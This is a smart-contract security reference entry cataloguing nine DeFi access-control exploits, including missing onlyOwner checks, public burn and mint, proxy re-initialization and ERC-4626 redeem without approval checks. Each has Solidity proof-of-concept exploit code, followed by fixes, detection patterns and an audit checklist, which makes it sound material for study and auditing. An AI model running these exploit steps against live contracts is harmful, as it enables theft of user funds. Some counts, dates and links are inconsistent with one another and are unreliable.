---
protocol: Multi-Protocol
chain: Ethereum, BSC, Fantom
category: access_control
vulnerability_type: Access Control Bypass Patterns
attack_type:
  - Missing onlyOwner modifier
  - Public burn any address
  - Public mint without restriction
  - Unprotected proxy re-initialization
  - Missing approval check in redeem
  - Unauthorized transferFrom via public function
  - Arbitrary swap-from via router
  - Fake factory injection for reward inflation
source: DeFiHackLabs
total_exploits_analyzed: 9
total_losses: "$3.3M+"
affected_component:
  - Token contracts
  - NFT auction contracts
  - Governance proxies
  - ERC-4626 vaults
  - DEX routers
  - Swap mining contracts
primitives:
  - access_control
  - approval_abuse
  - proxy_reinit
  - unauthorized_burn
  - unauthorized_mint
  - unauthorized_withdrawal
severity: CRITICAL
impact: Full protocol drain, governance takeover, token supply manipulation
exploitability: High
financial_impact: "$3.3M+ aggregate"
tags:
  - defihacklabs
  - access-control
  - missing-modifier
  - public-burn
  - public-mint
  - proxy-initialization
  - erc4626-redeem
  - unauthorized-transfer
  - fake-factory
  - approval-drain
  - governance-takeover
  - router-exploit
---

# DeFiHackLabs Access Control Bypass Patterns (2021-2022)

## Overview

This entry catalogs 8 access control bypass exploits from 2021-2022 sourced from [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs). These represent the most fundamental class of smart contract vulnerabilities — functions that should be restricted but aren't, allowing anyone to call privileged operations.

**Categories covered:**
1. **Missing `onlyOwner` on Withdrawal** — Anyone drains contract ETH
2. **Public `burn(address)` Without Restriction** — Anyone burns tokens from any holder
3. **Public `mint()` Without Restriction** — Anyone mints free tokens
4. **Unprotected Proxy `initialize()`** — Re-initialization overwrites governance parameters
5. **Missing Approval Check in `redeem()`** — Anyone redeems another user's vault shares
6. **Unauthorized `transferFrom` via Public Entry** — Public function drains user approvals
7. **Arbitrary `to` in Router Swap** — Router forces swaps from victim addresses
8. **Fake Factory Injection** — User-supplied factory inflates swap mining rewards
9. **Public NFT `_burn()`** — Anyone destroys any user's NFTs

---

## Vulnerability Description

### Root Cause Analysis

Access control vulnerabilities occur when:

1. **Missing Modifiers**: Functions meant for owners/admins lack `onlyOwner`, `onlyAdmin`, or role-based checks (FlippazOne, Uerii)
2. **Public Destructive Operations**: `burn(address, uint256)` accepts arbitrary addresses without requiring `msg.sender == from || approved[from][msg.sender]` (ShadowFi)
3. **Proxy Storage Gaps**: Upgradeable proxies store `initialized` in implementation storage, not proxy storage. After upgrade, `initialize()` can be called again because the proxy's storage slot is 0 (Audius)
4. **Missing Allowance Verification**: ERC-4626 `redeem(shares, receiver, owner)` doesn't verify `msg.sender` has allowance from `owner` (ReaperFarm)
5. **User-Controlled Routing Parameters**: Functions accept user-supplied `from`/`to` addresses or factory arrays without validation (ULME, GYMNetwork, BabySwap)

### Attack Scenario Taxonomy

**Tier 1 — Zero-Click Drain (no setup required):**
- FlippazOne: Call `ownerWithdrawAllTo(attacker)` → drain all ETH
- Uerii: Call `mint()` → receive free tokens → swap to ETH
- ShadowFi: Call `burn(pair, balance)` → manipulate price → profit

**Tier 2 — Approval-Based Drain (requires prior user approvals):**
- ULME: Call `buyMiner(victim, amount)` → transfers victim's approved USDT
- GYMNetwork: Call router with victim as `to` → forces swap from victim's approved tokens
- ReaperFarm: Call `redeem(shares, self, victim)` → steals victim's vault deposits

**Tier 3 — Protocol Takeover (requires multi-step attack):**
- Audius: Re-initialize governance → fabricate voting power → submit/execute malicious proposal
- BabySwap: Deploy fake factory → inflate swap rewards → drain mining contract

---

## Vulnerable Pattern Examples

### Pattern 1: Missing Access Control on Owner Withdrawal

**Severity**: 🔴 CRITICAL | **Loss**: All contract ETH | **Protocol**: FlippazOne | **Chain**: Ethereum

The `ownerWithdrawAllTo()` function lacks any access control modifier. The function name implies owner-only access, but there's no `onlyOwner` check.

```solidity
// @audit-issue No onlyOwner modifier — anyone can drain all ETH
// FlippazOne NFT auction contract
contract FlippazOne {
    // Function intended for owner only but has NO access control
    function ownerWithdrawAllTo(address toAddress) external {
        // @audit Missing: require(msg.sender == owner, "Not owner");
        payable(toAddress).transfer(address(this).balance);
    }
}

// Exploit: Single call drains entire contract
function testExploit() public {
    // @audit Anyone can call this — sends all ETH to attacker
    FlippazOne.ownerWithdrawAllTo(address(alice));
}
```

**Reference**: [DeFiHackLabs/src/test/2022-05/FlippazOne_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-05/FlippazOne_exp.sol) | Block: 15,083,765

---

### Pattern 2: Public burn(address) Enables LP Drain

**Severity**: 🔴 CRITICAL | **Loss**: ~$300K | **Protocol**: ShadowFi (SDF) | **Chain**: BSC

The SDF token has a `burn(address, uint256)` function callable by anyone, allowing an attacker to burn tokens from the LP pair, then sell at an inflated price.

```solidity
// @audit-issue Public burn function — no access control on 'from' address
// ShadowFi token allows anyone to burn from any address
function testExploit() public {
    // Step 1: Buy a small amount of SDF
    address(WBNB).call{value: 0.01 ether}("");
    WBNBToSDF();
    
    // Step 2: Burn ALL SDF from the liquidity pair (except 1 wei)
    // @audit No require(msg.sender == from) check
    SDF.burn(address(Pair), SDF.balanceOf(address(Pair)) - 1);
    
    // Step 3: Force pair to update reserves to near-zero SDF
    Pair.sync();
    
    // Step 4: Sell attacker's SDF at massively inflated price
    // @audit SDF/WBNB ratio went from normal to 1 wei SDF : all WBNB
    SDFToWBNB();
    // Profit: ~$300K
}
```

**Reference**: [DeFiHackLabs/src/test/2022-09/Shadowfi_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-09/Shadowfi_exp.sol) | Block: 20,969,095

---

### Pattern 3: Public mint() Without Any Restriction

**Severity**: 🟠 HIGH | **Loss**: ~$2.5K | **Protocol**: Uerii | **Chain**: Ethereum

The UERII token's `mint()` function has zero access control — anyone can call it to mint tokens for free, then swap them on DEXes.

```solidity
// @audit-issue Public mint() — no access control at all
function testExploit() public {
    // Step 1: Mint tokens for free — no onlyOwner, no role check, no cap
    UERII_TOKEN.mint();
    
    // Step 2: Approve DEX router
    UERII_TOKEN.approve(address(UNI_ROUTER), type(uint256).max);
    
    // Step 3: Swap free UERII → USDC → WETH
    _UERIIToUSDC();  // Dump on Uniswap V3
    _USDCToWETH();   // Convert to ETH
    // @audit Profit: ~$2.5K (limited by liquidity)
}
```

**Reference**: [DeFiHackLabs/src/test/2022-10/Uerii_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-10/Uerii_exp.sol) | Block: 15,767,837

---

### Pattern 4: Unprotected Proxy Re-Initialization (Governance Takeover)

**Severity**: 🔴 CRITICAL | **Loss**: 704 ETH (~$1.08M) | **Protocol**: Audius | **Chain**: Ethereum

Multiple Audius proxy contracts (Governance, Staking, DelegateManager) stored their `initialized` flag in implementation storage, not proxy storage. After any upgrade, `initialize()` could be called again, allowing an attacker to overwrite voting period, execution delay, guardian address, and voting power.

```solidity
// @audit-issue Unguarded initialize() — re-callable after proxy upgrade
function testExploit() public {
    // Step 1: Re-initialize Governance with attacker-controlled parameters
    // votingPeriod=3 blocks, executionDelay=0, guardian=self
    IGovernence(governance).initialize(
        address(this),  // registryAddress → attacker
        3,              // @audit votingPeriod = only 3 blocks
        0,              // @audit executionDelay = 0
        1, 4,
        address(this)   // @audit guardianAddress = attacker
    );
    
    // Step 2: Re-initialize Staking & DelegateManager for fake voting power
    IStaking(staking).initialize(address(this), address(this));
    IDelegateManagerV2(delegatemanager).initialize(address(this), address(this), 1);
    
    // Step 3: Fabricate massive voting power
    IDelegateManagerV2(delegatemanager).delegateStake(address(this), 1e31);
    
    // Step 4: Submit malicious proposal to drain treasury
    uint256 stealAmount = AUDIO.balanceOf(governance) * 99 / 100;
    IGovernence(governance).submitProposal(
        bytes32(uint256(3078)), 0,
        "transfer(address,uint256)",
        abi.encode(address(this), stealAmount),
        "Hello", "World"
    );
    
    // Step 5: Vote yes and execute (3-block voting period!)
    cheat.roll(15_201_795);
    IGovernence(governance).submitVote(85, IGovernence.Vote(2));
    cheat.roll(15_201_798);
    IGovernence(governance).evaluateProposalOutcome(85);
    
    // Step 6: Swap stolen AUDIO → ETH
    // @audit 704 ETH (~$1.08M) stolen via governance takeover
}
```

**Reference**: [DeFiHackLabs/src/test/2022-07/Audius_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-07/Audius_exp.sol) | Block: 15,201,793

---

### Pattern 5: Missing Approval Check in ERC-4626 Redeem

**Severity**: 🔴 CRITICAL | **Loss**: ~$1.7M | **Protocol**: ReaperFarm | **Chain**: Fantom

The `redeem(shares, receiver, owner)` function does not verify that `msg.sender` has spending allowance from `owner`. Anyone can redeem another user's vault shares to themselves.

```solidity
// @audit-issue No approval check when redeeming on behalf of owner
// ReaperVaultV2 (ERC-4626 vault)
function testExploit() public {
    address victim = 0x59cb9F088806E511157A6c92B293E5574531022A;
    uint256 victim_bal = ReaperVault.balanceOf(victim);
    
    // @audit redeem() allows any caller to specify any owner + any receiver
    // Missing: require(msg.sender == owner || allowance[owner][msg.sender] >= shares)
    ReaperVault.redeem(
        victim_bal,      // shares to redeem
        address(this),   // receiver = attacker
        victim           // owner = victim (no approval needed!)
    );
    // @audit Attacker receives victim's entire USDC deposit (~$1.7M aggregate)
}
```

**Reference**: [DeFiHackLabs/src/test/2022-08/ReaperFarm_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-08/ReaperFarm_exp.sol) | Block: 44,045,899 (Fantom)

---

### Pattern 6: Public Function Drains User Approvals

**Severity**: 🔴 CRITICAL | **Loss**: ~$250K | **Protocol**: ULME | **Chain**: BSC

The `buyMiner(address user, uint256 usdt)` function transfers USDT from the specified `user` using their existing approval to the ULME contract. Any caller can specify any victim address who has approved the ULME contract.

```solidity
// @audit-issue buyMiner() transfers FROM arbitrary user without msg.sender check
function testExploit() public {
    // Flash loan for sandwich profit amplification
    DPPAdvanced(dodo1).flashLoan(0, USDT.balanceOf(dodo1), address(this), new bytes(1));
}

function DPPFlashLoanCall(address, uint256, uint256, bytes calldata) external {
    // Buy ULME before draining victims (front-run)
    buyULME();
    
    // @audit Drain 101 victims who approved USDT to ULME contract
    for (uint256 i = 0; i < numOfVictims; ++i) {
        uint256 balance = USDT.balanceOf(address(victims[i]));
        uint256 allowance = USDT.allowance(address(victims[i]), address(ULME));
        uint256 take = balance > allowance ? allowance : balance;
        if (take / 1 ether > 1) {
            // @audit Anyone can call buyMiner with any user's address
            ULME.buyMiner(victims[i], 100 * take / 110 - 1);
        }
    }
    
    // Sell ULME after (back-run) — profit from sandwich
    sellULME();
}
```

**Reference**: [DeFiHackLabs/src/test/2022-10/ULME_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-10/ULME_exp.sol) | Block: 22,476,695

---

### Pattern 7: Router Swaps From Arbitrary Address

**Severity**: 🔴 CRITICAL | **Loss**: Variable (18 victims drained) | **Protocol**: GYM Network | **Chain**: BSC

The GYM Router's `swapExactTokensForTokensSupportingFeeOnTransferTokens` accepts a `to` parameter and swaps tokens **from** that address using their existing approvals. The attacker creates a fake token pair, then forces victims to swap into it.

```solidity
// @audit-issue Router swaps FROM the 'to' address — drains victim approvals
function testExploit() public {
    // Step 1: Deploy fake USDT token
    fakeUSDT = new FakeUSDT();
    
    // Step 2: Create GYMNET/fakeUSDT pair — attacker controls liquidity
    PancakeRouter.addLiquidity(
        address(GYMNET), address(fakeUSDT),
        initialGYMNET, initialFakeUSDT,
        0, 0, address(this), block.timestamp
    );
    
    // Step 3: Force each victim to swap GYMNET → fakeUSDT
    for (uint256 i = 0; i < victims.length; i++) {
        address[] memory path = new address[](2);
        path[0] = address(GYMNET);
        path[1] = address(fakeUSDT);
        
        // @audit Router uses victim's approval to swap FROM victim
        GymRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            GYMNET.balanceOf(victims[i]),
            0,           // amountOutMin = 0
            path,
            victims[i]   // @audit 'to' = victim, but router transfers FROM victim
        );
    }
    
    // Step 4: Remove liquidity to recover GYMNET
    PancakeRouter.removeLiquidity(...);
}
```

**Reference**: [DeFiHackLabs/src/test/2023-07/GYMNET_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-07/GYMNET_exp.sol) | Block: 30,448,986

---

### Pattern 8: Fake Factory Injection Inflates Swap Mining Rewards

**Severity**: 🟠 HIGH | **Loss**: BABY token rewards | **Protocol**: BabySwap | **Chain**: BSC

The BabySwap router allows callers to supply custom `factories` arrays. The SwapMining contract calculates rewards based on the reserves reported by the factory's pair. An attacker deploys a fake factory returning extreme reserves (10^28:1), making tiny swaps appear astronomically large for reward computation.

```solidity
// @audit-issue User-supplied factory controls reward calculation
contract FakeFactory {
    address public fakePair;
    
    function getPair(address, address) external view returns (address) {
        return fakePair;
    }
}

contract FakePair {
    // @audit Returns extreme reserve ratio — inflates swap value
    function getReserves() external pure returns (uint112, uint112, uint32) {
        return (10_000_000_000 * 1e18, 1, 0);
    }
}

function testExploit() public {
    FakeFactory factory = new FakeFactory();
    address[] memory factories = new address[](1);
    factories[0] = address(factory);
    
    // @audit Tiny swap (10,000 wei) through fake factory
    // SwapMining sees extreme reserves → thinks swap was enormous
    BABYSWAP_ROUTER.swapExactTokensForTokens(
        10_000, 0, path, factories, fees,
        address(this), block.timestamp
    );
    
    // @audit Claim massively inflated mining rewards
    SWAP_MINING.takerWithdraw();
}
```

**Reference**: [DeFiHackLabs/src/test/2022-10/BabySwap_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-10/BabySwap_exp.sol) | Block: 21,811,979

---

### Pattern 9: Public NFT _burn() Allows Arbitrary Token Destruction

**Severity**: 🔴 CRITICAL | **Loss**: NFT asset destruction | **Protocol**: The Sandbox Land | **Chain**: Ethereum

The Sandbox Land NFT contract exposed a `_burn()` function as public, allowing anyone to burn NFTs from any address. Unlike ERC20 burns (Pattern 2), this directly destroys non-fungible property with no price manipulation needed.

```solidity
// @audit-issue Public _burn() — anyone can destroy any user's NFTs
// @PoC: DeFiHackLabs/src/test/2022-02/Sandbox_exp.sol
interface ILand {
    function _burn(address from, address owner, uint256 id) external;
    function _numNFTPerAddress(address owner) external view returns (uint256);
}

function testExploit() public {
    address victim = 0x9cfA73B8d300Ec5Bf204e4de4A58e5ee6B7dC93C;

    // @audit Victim owns 2762 Land NFTs
    // _burn function is PUBLIC — no access control
    for (uint256 i = 0; i < 100; i++) {
        // @audit Burns victim's NFTs one at a time — no authorization check
        Land._burn(victim, victim, 3738);
    }
    // @audit 100 NFTs destroyed from victim. Could burn all 2762.
}
```

**Reference**: [DeFiHackLabs/src/test/2022-02/Sandbox_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-02/Sandbox_exp.sol) | Block: 14,163,041

---

## Impact Analysis

| Protocol | Date | Loss | Root Cause | Chain |
|----------|------|------|-----------|-------|
| ReaperFarm | Aug 2022 | ~$1.7M | Missing approval check in ERC-4626 redeem | Fantom |
| Audius | Jul 2022 | ~$1.08M | Unguarded proxy re-initialization | Ethereum |
| ShadowFi | Sep 2022 | ~$300K | Public burn(address) | BSC |
| ULME | Oct 2022 | ~$250K | Public buyMiner drains approvals | BSC |
| FlippazOne | Jul 2022 | Contract ETH | Missing onlyOwner on withdrawal | Ethereum |
| GYMNetwork | Jul 2023 | Variable | Router swaps from arbitrary address | BSC |
| BabySwap | Oct 2022 | BABY tokens | Fake factory injection | BSC |
| Uerii | Oct 2022 | ~$2.5K | Public mint() | Ethereum |
| The Sandbox | Feb 2022 | NFT destruction | Public _burn() on Land NFTs | Ethereum |

**Aggregate**: Over $3.3M in confirmed losses from access control failures.

---

## Secure Implementation

### Fix 1: Proper Access Control Modifiers

```solidity
// SECURE: Always use access control modifiers on privileged functions
contract SecureContract is Ownable {
    // @audit-fix onlyOwner prevents unauthorized withdrawal
    function ownerWithdrawAllTo(address toAddress) external onlyOwner {
        payable(toAddress).transfer(address(this).balance);
    }
    
    // @audit-fix Only token holder or approved spender can burn
    function burn(address from, uint256 amount) external {
        require(
            msg.sender == from || allowance[from][msg.sender] >= amount,
            "Not authorized"
        );
        if (msg.sender != from) {
            allowance[from][msg.sender] -= amount;
        }
        _burn(from, amount);
    }
    
    // @audit-fix mint requires MINTER_ROLE
    function mint(address to, uint256 amount) external onlyRole(MINTER_ROLE) {
        _mint(to, amount);
    }
}
```

### Fix 2: Proxy Initialization Guard

```solidity
// SECURE: Use OpenZeppelin's Initializable with reinitializer protection
import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";

contract SecureGovernance is Initializable {
    // @audit-fix initializer modifier prevents re-initialization
    function initialize(
        address registry,
        uint256 votingPeriod,
        uint256 executionDelay,
        address guardian
    ) external initializer {
        require(votingPeriod >= MIN_VOTING_PERIOD, "Period too short");
        require(executionDelay >= MIN_EXECUTION_DELAY, "Delay too short");
        _registry = registry;
        _votingPeriod = votingPeriod;
        _executionDelay = executionDelay;
        _guardian = guardian;
    }
}
```

### Fix 3: ERC-4626 Redeem Authorization

```solidity
// SECURE: Verify caller authorization in redeem
function redeem(
    uint256 shares,
    address receiver,
    address owner
) external returns (uint256 assets) {
    // @audit-fix Verify msg.sender has allowance from owner
    if (msg.sender != owner) {
        uint256 allowed = allowance[owner][msg.sender];
        require(allowed >= shares, "Insufficient allowance");
        allowance[owner][msg.sender] = allowed - shares;
    }
    
    assets = previewRedeem(shares);
    _burn(owner, shares);
    IERC20(asset).safeTransfer(receiver, assets);
}
```

### Fix 4: Validate Routing Parameters

```solidity
// SECURE: Validate all routing parameters
contract SecureRouter {
    mapping(address => bool) public whitelistedFactories;
    
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address[] calldata factories,
        address to
    ) external {
        // @audit-fix msg.sender must be the token source, not 'to'
        require(to == msg.sender || approvedDelegates[msg.sender], "Invalid to");
        
        // @audit-fix Only allow whitelisted factories
        for (uint i = 0; i < factories.length; i++) {
            require(whitelistedFactories[factories[i]], "Unknown factory");
        }
        
        IERC20(path[0]).transferFrom(msg.sender, address(this), amountIn);
        // ... perform swap
    }
}
```

---

## Detection Patterns

### Static Analysis

```yaml
- pattern: "function.*withdraw|function.*drain|function.*claim.*Fund"
  check: "Verify onlyOwner/onlyAdmin modifier is present"
  
- pattern: "function burn\\(address"
  check: "Verify msg.sender == from || isApproved(from, msg.sender)"
  
- pattern: "function mint\\("
  check: "Verify onlyRole(MINTER_ROLE) or onlyOwner modifier"
  
- pattern: "function initialize\\("
  check: "Verify initializer modifier (OpenZeppelin) or initialized flag in proxy storage"
  
- pattern: "redeem.*owner|withdraw.*owner"
  check: "Verify msg.sender == owner || allowance[owner][msg.sender] >= amount"
  
- pattern: "transferFrom.*user|transferFrom.*victim|transferFrom.*\\bto\\b"
  check: "Verify the 'from' address is msg.sender, not a user-supplied parameter"
  
- pattern: "factories\\[|factory.*param|getReserves"
  check: "Verify factory addresses are whitelisted, not user-supplied"
  
- pattern: "buyMiner|buyToken.*address user"
  check: "Verify function doesn't transfer from user-supplied address using their approvals"
```

### Invariant Checks

```
INV-AC-001: Only the contract owner can withdraw contract funds
INV-AC-002: burn(from, amount) requires msg.sender == from or msg.sender has explicit approval
INV-AC-003: mint() requires authorized caller (minter role, owner, or governance)
INV-AC-004: initialize() can only be called once per proxy deployment
INV-AC-005: redeem/withdraw on behalf of owner requires msg.sender approval from owner
INV-AC-006: transferFrom in any function must transfer from msg.sender, not from user-supplied address
INV-AC-007: Factory/pair addresses used in routing and reward calculation must be whitelisted
INV-AC-008: No function should allow moving tokens from address X based solely on X's approval to the contract
```

---

## Audit Checklist

- [ ] **Withdrawal Functions**: Do all withdrawal/drain functions have `onlyOwner` or equivalent access control?
- [ ] **Burn Authorization**: Does `burn(address from, ...)` require `msg.sender == from` or explicit approval?
- [ ] **Mint Authorization**: Does `mint()` require an authorized caller role?
- [ ] **Proxy Initialization**: Is `initialize()` guarded by `initializer` modifier? Does the flag survive upgrades?
- [ ] **ERC-4626 Compliance**: Does `redeem(shares, receiver, owner)` check `msg.sender` allowance from `owner`?
- [ ] **TransferFrom Source**: In all functions that call `transferFrom`, is the `from` address always `msg.sender` (not a user-supplied parameter)?
- [ ] **Factory Whitelisting**: Are factory/router addresses used in reward calculations whitelisted, not user-supplied?
- [ ] **Approval Scope**: Do any functions allow an attacker to spend another user's approvals to the contract?

---

## Real-World Examples

| Protocol | Date | Loss | TX/Reference |
|----------|------|------|-------------|
| ReaperFarm | Aug 2022 | ~$1.7M | Block 44,045,899 (Fantom) |
| Audius | Jul 2022 | ~$1.08M | [Etherscan](https://etherscan.io/tx/0xfefd829e246002a8fd061eede7501bccb6e244a9aacea0ebceaecef5d877a984) |
| ShadowFi | Sep 2022 | ~$300K | [BSCScan](https://bscscan.com/tx/0x) Block 20,969,095 |
| ULME | Oct 2022 | ~$250K | [BSCScan](https://bscscan.com/tx/0x) Block 22,476,695 |
| FlippazOne | Jul 2022 | All ETH | Block 15,083,765 |
| GYMNetwork | Jul 2023 | Variable | Block 30,448,986 |
| BabySwap | Oct 2022 | BABY rewards | Block 21,811,979 |
| Uerii | Oct 2022 | ~$2.5K | Block 15,767,837 |
| The Sandbox | Feb 2022 | NFT destruction | Block 14,163,041 |

---

## Keywords

access_control, missing_modifier, onlyOwner, public_burn, public_mint, unauthorized_withdrawal, proxy_initialization, reinitializer, erc4626_redeem, approval_abuse, transferFrom_exploit, fake_factory, reward_inflation, governance_takeover, delegateStake, voting_power_fabrication, router_exploit, swap_from_arbitrary_address, nft_burn, Land_NFT, Sandbox, defihacklabs, FlippazOne, ShadowFi, Uerii, Audius, ReaperFarm, ULME, GYMNetwork, BabySwap
